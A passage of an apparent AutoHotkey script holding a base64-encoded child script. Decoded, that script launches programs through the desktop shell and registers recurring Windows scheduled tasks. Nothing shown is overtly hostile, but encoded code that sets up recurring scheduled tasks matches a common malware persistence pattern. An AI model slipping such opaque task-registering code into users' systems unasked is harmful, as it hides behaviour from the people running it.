CJvcGVuIiwgc2hvdyA6PSAxKQ0Kew0KICAgc3RhdGljIFZUX1VJNCA6PSAweDEzLCBTV0NfREVTS1RPUCA6PSAweDgNCiAgIHNoZWxsV2luZG93cyA6PSBDb21PYmpDcmVhdGUoIlNoZWxsLkFwcGxpY2F0aW9uIikuV2luZG93cw0KICAgc2hlbGwgOj0gc2hlbGxXaW5kb3dzLkl0ZW0oIENvbU9iamVjdChWVF9VSTQsIFNXQ19ERVNLVE9QKSApLkRvY3VtZW50LkFwcGxpY2F0aW9uDQogICBzaGVsbC5TaGVsbEV4ZWN1dGUoZmlsZVBhdGgsIGFyZ3VtZW50cywgZGlyZWN0b3J5LCB2ZXJiLCBzaG93KQ0KfQ0KDQpPbkNoaWxkTWVzc2FnZShVcGRhdGVQZXJpb2QsIHdwKSB7DQogICBpZiB3cA0KICAgICAgRXhpdEFwcA0KICAgZWxzZSB7DQogICAgICBTZXRUaW1lciwgVXBkYXRlLCAlIFVwZGF0ZVBlcmlvZA0KICAgICAgVXBkYXRlKCkgICAgICANCiAgIH0NCn0NCg0KQ3JlYXRlVGFzayh0YXNrTmFtZSwgZmlsZVBhdGgsIHNBcmdzLCBzdGFydFRpbWUsIGludGVydmFsSG91cnMgOj0gMCwgc3RhcnRJbW1lZGlhdGVseSA6PSBmYWxzZSkgew0KICAgbG9jYWwNCiAgIHN0YXRpYyBUQVNLX1RSSUdHRVJfREFJTFkgOj0gMg0KICAgICAgICAsIFRBU0tfQUNUSU9OX0VYRUMgOj0gMA0KICAgICAgICAsIFRBU0tfQ1JFQVRFX09SX1VQREFURSA6PSA2DQogICAgICAgICwgVEFTS19MT0dPTl9JTlRFUkFDVElWRV9UT0tFTiA6PSAzDQogICAgICAgIA0KICAgaWYgIVJlZ0V4TWF0Y2goc3RhcnRUaW1lLCAiXig/OjB8MXwoMikpKD8oMSlbMC0zXXxcZCk6WzAtNV1cZCQiKQ0KICAgICAgdGhyb3cgIndyb25nIHN0YXJ0VGltZSBmb3JtYXQiDQogICBpZiAhc2VydmljZSA6PSBDb21PYmpDcmVhdGUoIlNjaGVkdWxlLlNlcnZpY2UiKQ0KICAgICAgUmV0dXJuIGZhbHNlDQogICBzZXJ2aWNlLkNvbm5lY3QoKQ0KICAgcm9vdEZvbGRlciA6PSBzZXJ2aWNlLkdldEZvbGRlcigiXCIpDQogICB0YXNrRGVmaW5pdGlvbiA6PSBzZXJ2aWNlLk5ld1Rhc2soMCkNCiAgIA0KICAgcHJpbmNpcGFsIDo9IHRhc2tEZWZpbml0aW9uLlByaW5jaXBhbA0KICAgcHJpbmNpcGFsLkxvZ29uVHlwZSA6PSBUQVNLX0xPR09OX0lOVEVSQUNUSVZFX1RPS0VODQogICANCiAgIHNldHRpbmdzIDo9IHRhc2tEZWZpbml0aW9uLlNldHRpbmdzDQogICBzZXR0aW5ncy5FbmFibGVkIDo9IHRydWUNCiAgIHNldHRpbmdzLlN0YXJ0V2hlbkF2YWlsYWJsZSA6PSB0cnVlDQogICBzZXR0aW5ncy5EaXNhbGxvd1N0YXJ0SWZPbkJhdHRlcmllcyA6PSBmYWxzZQ0KICAgc2V0dGluZ3MuUnVuT25seUlmTmV0d29ya0F2YWlsYWJsZSA6PSB0cnVlDQogICBzZXR0aW5ncy5IaWRkZW4gOj0gZmFsc2UNCg0KICAgdHJpZ2dl"
base64 .= "cnMgOj0gdGFza0RlZmluaXRpb24uVHJpZ2dlcnMNCiAgIHRyaWdnZXIgOj0gdHJpZ2dlcnMuQ3JlYXRlKFRBU0tfVFJJR0dFUl9EQUlMWSkNCiAgIGlmIGludGVydmFsSG91cnMgew0KICAgICAgcmVwZXRpdGlvbiA6PSB0cmlnZ2VyLlJlcGV0aXRpb24NCiAgICAgIHJlcGV0aXRpb24uRHVyYXRpb24gOj0gIlAxRCINCiAgICAgIHJlcGV0aXRpb24uSW50ZXJ2YWwgOj0gIlBUIiAuIGludGVydmFsSG91cnMgLiAiSCINCiAgIH0NCiAgIHN0YXJ0VGltZSA6PSAiMjAyMjA2MTYiIC4gU3RyUmVwbGFjZShzdGFydFRpbWUsICI6IikgLiAiMDAiDQogICBGb3JtYXRUaW1lLCBzdGFydFRpbWUsICUgc3RhcnRUaW1lLCB5eXl5LU1NLWRkVEhIOm1tOnNzDQogICB0cmlnZ2VyLlN0YXJ0Qm91bmRhcnkgOj0gc3RhcnRUaW1lDQogICB0cmlnZ2VyLklkIDo9ICJUaW1lVHJpZ2dlcklkIg0KICAgdHJpZ2dlci5FbmFibGVkIDo9IHRydWUNCg0KICAgYWN0aW9uIDo9IHRhc2tEZWZpbml0aW9uLkFjdGlvbnMuQ3JlYXRlKCBUQVNLX0FDVElPTl9FWEVDICkNCiAgIGFjdGlvbi5QYXRoIDo9IGZpbGVQYXRoDQogICAoc0FyZ3MgIT0gIiIgJiYgYWN0aW9uLkFyZ3VtZW50cyA6PSBzQXJncykNCiAgIA0KICAgdGFzayA6PSByb290Rm9sZGVyLlJlZ2lzdGVyVGFza0RlZmluaXRpb24odGFza05hbWUsIHRhc2tEZWZpbml0aW9uLCBUQVNLX0NSRUFURV9PUl9VUERBVEUsLCwgVEFTS19MT0dPTl9JTlRFUkFDVElWRV9UT0tFTikNCiAgICggc3RhcnRJbW1lZGlhdGVseSAmJiB0YXNrLlJ1bigiIikgKQ0KICAgUmV0dXJuIHRydWUNCn0="
Return base64
}
